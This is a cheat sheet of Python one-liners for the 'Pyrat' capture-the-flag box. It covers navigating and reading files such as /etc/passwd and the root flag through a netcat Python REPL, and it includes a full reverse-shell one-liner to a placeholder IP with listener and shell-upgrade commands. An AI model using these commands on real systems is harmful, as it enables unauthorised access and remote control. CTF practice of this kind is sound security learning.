
### 🐍 Python One-Liners for Navigation in Netcat

#### 📂 List directories

```python
import os; print(os.listdir("/"))
```

List contents of `/home`:

```python
import os; print(os.listdir("/home"))
```

#### 📖 Read a file

```python
print(open("/etc/passwd").read())
```

Or:

```python
print(open("/home/pyrat/user.txt").read())
```

#### 📌 Get current working directory

```python
import os; print(os.getcwd())
```

#### 🔁 Change directory

```python
import os; os.chdir("/home/pyrat"); print(os.listdir())
```

#### 👤 Get username

```python
import os; print(os.getlogin())
```

#### 🆔 Get UID/GID

```python
import os; print(os.getuid(), os.getgid())
```

---

### 🔑 Quick Workflow in Pyrat

From your nc Python REPL:

1. See where you are:

   ```python
   import os; print(os.getcwd())
   ```
2. Check `/home`:

   ```python
   import os; print(os.listdir("/home"))
   ```
3. Read the user flag:

   ```python
   print(open("/home/pyrat/user.txt").read())
   ```
4. Look into `/root` for the root flag:

   ```python
   print(open("/root/root.txt").read())
   ```
## ADVANCED.
## 🐍 Python One-Liners for Netcat REPL
### 📂 **Directory Navigation**

```python
import os; print(os.getcwd())                       # current working dir
import os; print(os.listdir("/"))                   # list root dir
import os; print(os.listdir("/home"))               # list /home
import os; os.chdir("/home/pyrat"); print(os.getcwd())  # change dir
```

---

### 📖 **File Reading**

```python
print(open("/etc/passwd").read())                   # read entire file
print(open("/home/pyrat/user.txt").read())          # read user flag
print(open("/root/root.txt").read())                # read root flag
print(open("/etc/hosts").read())                    # read hosts file
```

*Read file line by line*:

```python
[print(line.strip()) for line in open("/etc/passwd")]
```

---

### 👤 **User / System Info**

```python
import os; print(os.getlogin())                     # current user
import os; print(os.getuid(), os.getgid())          # uid/gid
import platform; print(platform.uname())            # system info
```

---

### 🔍 **Search / Enumeration**

```python
import os; [print(f) for f in os.listdir("/var/www")]   # list web dir
import os; [print(f) for f in os.listdir("/tmp")]       # list tmp dir
```

*Recursive walk*:

```python
import os; [print(os.path.join(dp, f)) for dp, dn, fn in os.walk("/home") for f in fn]
```

---

### ⚡ **File Writing / Uploads**

```python
open("/tmp/test.txt","w").write("Hello from Python!")  # write file
```

---

### 🔄 **Execute Commands (if allowed)**

If `subprocess` works:

```python
import subprocess; print(subprocess.getoutput("id"))
import subprocess; print(subprocess.getoutput("ls -la /home"))
```

---

### 📡 **Reverse Shell (if outbound works)**

```python
import socket,subprocess,os; s=socket.socket(); s.connect(("YOUR_IP",1234)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["/bin/sh","-i"])
```

*(then listen on your machine with `nc -lvnp 1234`)*

---

## 🚀 Quick Attack Flow

1. See where you are:

   ```python
   import os; print(os.getcwd())
   ```
2. Check `/home`:

   ```python
   import os; print(os.listdir("/home"))
   ```
3. Read flags:

   ```python
   print(open("/home/pyrat/user.txt").read())
   print(open("/root/root.txt").read())
   ```
4. If blocked → enumerate recursively:

   ```python
   import os; [print(p) for p in os.listdir("/")]
   ```


   🛠️ Post-Reverse Shell Upgrade (Optional)\
Once you catch the shell:


nc -lvnp 4444

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
CTRL+Z
stty raw -echo; fg
```



# NAVIGATING DIRECTORY IN PYTHON like ls -la and for finding files too.

In Python:

* `"."` → current working directory
* `".."` → parent directory
* `"/something"` → absolute path from root

Ahhh 👌 I see what happened — in the one-liner I gave, Python was only checking `os.path.isdir(f)` without the **full path**.

When you run from `/home/pyrat`, and the code just checks `"etc"` instead of `"/etc"`, it will assume it’s a file (because it doesn’t exist relative to your current directory).

---

## 🔧 Corrected `ls -la` Equivalent (Pyrat Example)

Use the **absolute path** in the check:

### 1. For current working directory (`.`)

```python
import os; [print(f"{'DIR ' if os.path.isdir(os.path.join('.',f)) else 'FILE'}  {f}") for f in os.listdir('.')]
```

---

### 2. For `/home`

```python
import os; [print(f"{'DIR ' if os.path.isdir(os.path.join('/home',f)) else 'FILE'}  {f}") for f in os.listdir('/home')]
```

---

### 3. For `/home/pyrat`

```python
import os; [print(f"{'DIR ' if os.path.isdir(os.path.join('/home/pyrat',f)) else 'FILE'}  {f}") for f in os.listdir('/home/pyrat')]
```

---

### 4. For `/root`

```python
import os; [print(f"{'DIR ' if os.path.isdir(os.path.join('/root',f)) else 'FILE'}  {f}") for f in os.listdir('/root')]
```

---

### ✅ Example Expected Output in `/home/pyrat`
<img width="598" height="558" alt="image" src="https://github.com/user-attachments/assets/0bed31c3-7d2c-42c0-8aa6-0cbeb94ce49b" />


